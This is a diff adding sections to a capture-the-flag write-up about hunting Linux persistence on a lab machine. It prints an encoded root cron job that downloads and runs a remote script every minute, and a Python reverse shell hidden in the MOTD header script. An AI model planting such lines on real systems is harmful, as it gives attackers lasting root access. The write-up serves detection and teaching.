@@ -33,6 +33,43 @@ Happy hunting, Phantom. May the best ghost win.
 To start with I settled on tackling every hint separately.
 
 ## Time is on my side, always running like clockwork.
+This is a big pointer to cron jobs, which allow attackers to maintain persistence by executing commands on a schedule. There may have been a suspicious script dropped in some cron directory. After unsuccessfully checking cron directories like cron.hourly, cron.weekly and cron.monthly I pivoted to checking user crontabs. By using *sudo crontab -l* we were able to get a list of root's cron jobs.
+
+```
+ubuntu@tryhackme:~$ sudo crontab -l
+# Edit this file to introduce tasks to be run by cron.
+# 
+# Each task to run has to be defined through a single line
+# indicating with different fields when the task will be run
+# and what command to run for the task
+#
+# To define the time you can provide concrete values for
+# minute (m), hour (h), day of month (dom), month (mon),
+# and day of week (dow) or use '*' in these fields (for 'any').
+#
+* * * * * /bin/bash -c 'echo Y3VybCAtcyA1NDQ4NGQ3Yjc5MzAuc3RvcmFnM19jMXBoM3JzcXU0ZC5uZXQvYS5zaCB8IGJhc2gK | base64 -d | bash 2>/dev/null'
+# Notice that tasks will be started based on the cron's system
+# daemon's notion of time and timezones.
+#
+```
+
+Persistence mechanism spotted. The entry in question that is interesting for us is
+
+```
+* * * * * /bin/bash -c 'echo Y3VybCAtcyA1NDQ4NGQ3Yjc5MzAuc3RvcmFnM19jMXBoM3JzcXU0ZC5uZXQvYS5zaCB8IGJhc2gK | base64 -d | bash 2>/dev/null'
+```
+
+The stars give us an idea of the schedule. Here they mean, that every minute, of every hour, of every day, forever the rest of the entry gets executed. Here a base64-encoded string gets decoded and executed with Bash. Errors get suppressed *(2>/dev/null)*.
+
+Decoding the string gives us the following output.
+
+<img width="628" height="529" alt="image" src="https://github.com/user-attachments/assets/ead5b56e-7c67-4515-ae78-24062ec5d5d8" />
+
+Basically every minute, the system connects to a remote attacker-controlled server, downloads a script *a.sh* and executes it as root. An easy way for persistent access and automatic re-infection. Even if we kill the reverse shell, it would come back within 60 seconds. That's why he said, that time would be on his side. Decoding the hex value inside the decoded base64-encoding reveals the first part of the message to us.
+
+<img width="1409" height="422" alt="image" src="https://github.com/user-attachments/assets/e696cdfc-b900-4cd6-b663-734d2b39cd67" />
+
+
 
 ## A secret handshake gets me in every time.
 This hint screams authentication bypass via credentials that don't expire. We need to do a cryptographic exchange that proves our validity. On Linux that would easily be possible through SSH key-based access. They get us in every time, as they don't expire by default, survive password resets, are often ignored for years and still work even if MFA is added. With this gained knowledge I looked through all users in the hopes of finding some keys and indeed quickly found an interesting directory called *.ssh*
@@ -102,5 +139,86 @@ When decoding the base64 encoding, we get the third part of our message.
 <img width="628" height="529" alt="image" src="https://github.com/user-attachments/assets/652e3c9e-edbd-4d60-9640-610d8bb2abb8" />
 
 ## I run with the big dogs, booting up alongside the system.
+This could very well refer to system/root-level processes and start during system boot. It survives reboots and runs before any user logs in. So we're talking about init / service mechanisms. Most Linux distros use systemd for that, so the primary directory to check out is */etc/systemd/system/*
+
+
 
 ## I love welcome messages.
+In Linux this could be a hint for login banners. When logging into a Linux system (locally or via SSH), we can sometimes see text like
+
+```
+Welcome to Ubuntu 22.04 LTS
+```
+
+That text comes from specific files that are displayed automatically on login. They are loved by attackers as they are executed or displayed every login and almost nobody really inspects those. Checking out the */etc/update-motd.d* is vital as it contains scripts that generate the MOTD dynamically. It's a prime persistance location. Anything executable there runs at login, as root, every time. By just checking out the directory we can already see suspicious activity.
+
+```
+ubuntu@tryhackme:~$ sudo ls -la /etc/update-motd.d
+total 68
+drwxr-xr-x   2 root root  4096 Mar  7  2025 .
+drwxr-xr-x 172 root root 12288 Feb  3 00:46 ..
+-rwxr-xr-x   1 root root  1499 Mar  7  2025 00-header
+-rwxr-xr-x   1 root root  1151 Jan  2  2024 10-help-text
+lrwxrwxrwx   1 root root    46 Sep  1  2024 50-landscape-sysinfo -> /usr/share/landscape/landscape-sysinfo.wrapper
+-rwxr-xr-x   1 root root  5023 Aug 17  2020 50-motd-news
+-rwxr-xr-x   1 root root    84 May 11  2023 85-fwupd
+-rwxr-xr-x   1 root root   218 Apr  2  2020 90-updates-available
+-rwxr-xr-x   1 root root   296 Jun 17  2024 91-contract-ua-esm-status
+-rwxr-xr-x   1 root root   558 Jan  9  2023 91-release-upgrade
+-rwxr-xr-x   1 root root   165 Jul 21  2020 92-unattended-upgrades
+-rwxr-xr-x   1 root root   379 Feb 22  2024 95-hwe-eol
+-rwxr-xr-x   1 root root   111 Feb 25  2020 97-overlayroot
+-rwxr-xr-x   1 root root   142 Apr  2  2020 98-fsck-at-reboot
+-rwxr-xr-x   1 root root   144 Apr  2  2020 98-reboot-required
+```
+
+*00-header* sticks out as it seems to have been modified very recently. Let's cat the header file.
+
+```
+ubuntu@tryhackme:~$ sudo cat /etc/update-motd.d/00-header 
+#!/bin/sh 
+#
+# 00-header - create the header of the MOTD 
+# Copyright (C) 2009-2010 Canonical Ltd. 
+# 
+# Authors: Dustin Kirkland <kirkland@canonical.com> 
+#
+# This program is free software; you can redistribute it and/or modify 
+# it under the terms of the GNU General Public License as published by 
+# the Free Software Foundation; either version 2 of the License, or 
+# (at your option) any later version. 
+#
+# This program is distributed in the hope that it will be useful, 
+# but WITHOUT ANY WARRANTY; without even the implied warranty of 
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the 
+# GNU General Public License for more details. 
+# 
+# You should have received a copy of the GNU General Public License along 
+# with this program; if not, write to the Free Software Foundation, Inc., 
+# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
+
+[ -r /etc/lsb-release ] && . /etc/lsb-release 
+if [ -z "$DISTRIB_DESCRIPTION" ] && [ -x /usr/bin/lsb_release ]; then 
+    # Fall back to using the very slow lsb_release utility 
+    DISTRIB_DESCRIPTION=$(lsb_release -s -d) 
+fi 
+
+python3 -c 'import socket,subprocess,os; 
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); 
+s.connect(("4c61737420706172743a206430776e7d0.h1dd3nd00r.n3t",
+)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); 
+p=subprocess.call(["/bin/sh","-i"]);' 2>/dev/null 
+
+printf "Welcome to %s (%s %s %s)\n" "$DISTRIB_DESCRIPTION" 
+"$(uname -o)" "$(uname -r)" "$(uname -m)"
+```
+
+As we can see the header script has been modified to include a Python reverse shell that connects to a remote attacker-controlled server and spawn an interactive root shell every time a user logs in.
+
+```
+python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("4c61737420706172743a206430776e7d0.h1dd3nd00r.n3t",)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);' 2>/dev/null
+```
+
+This provides stealthy, reliable persistence. We take the last hex encoded string from the malicious code and decode to get the final part of our message.
+
+<img width="1409" height="422" alt="image" src="https://github.com/user-attachments/assets/ef658d39-51e1-44aa-a2de-620d4e9b2879" />
